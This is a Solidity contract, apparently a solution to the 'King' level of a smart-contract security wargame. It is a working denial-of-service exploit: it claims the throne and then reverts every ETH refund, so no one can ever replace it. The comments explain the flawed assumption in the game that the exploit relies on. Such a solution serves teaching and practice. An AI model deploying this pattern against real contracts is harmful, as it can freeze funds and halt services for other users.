// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IKing {
    function prize() external view returns (uint256);
}

// The King game works like this:
// 1. Whoever sends more ETH than the current prize becomes the new king
// 2. When a new king is crowned, the contract sends the prize back to the previous king
// 3. The vulnerability is that the contract assumes the king can receive ETH
//
// Our attack works by:
// 1. Becoming king with a contract that REFUSES to accept ETH
// 2. When someone tries to become the new king, our contract's receive() function reverts
// 3. This makes it impossible for anyone else to become king
contract KingAttack {
    // Store the address of the King game contract
    address payable immutable game;

    constructor(address payable kingGame){
        game = kingGame;
    }

    // Helper function to check the current prize
    function getCurrentPrize() public view returns (uint256 prize) {
        prize = IKing(game).prize();
    }

    // Function to become king
    function participate() external payable {
        // Basic checks
        require(msg.value > 1 wei, "Send some $$");
        require(getCurrentPrize() < msg.value, "Send more than current");

        // Send ETH to become king
        // The King contract will store our contract address as the king
        (bool success,) = game.call{value: msg.value}("");
        require(success, "Could not participate to the game");
    }

    // This is the key to the attack:
    // When someone tries to become the new king, the King contract will try to
    // send ETH back to us (the previous king) via this receive function
    // By making it always revert, we prevent anyone from becoming the new king
    // This is a Denial of Service (DOS) attack
    receive() external payable {
        revert("DOS");
    }
}
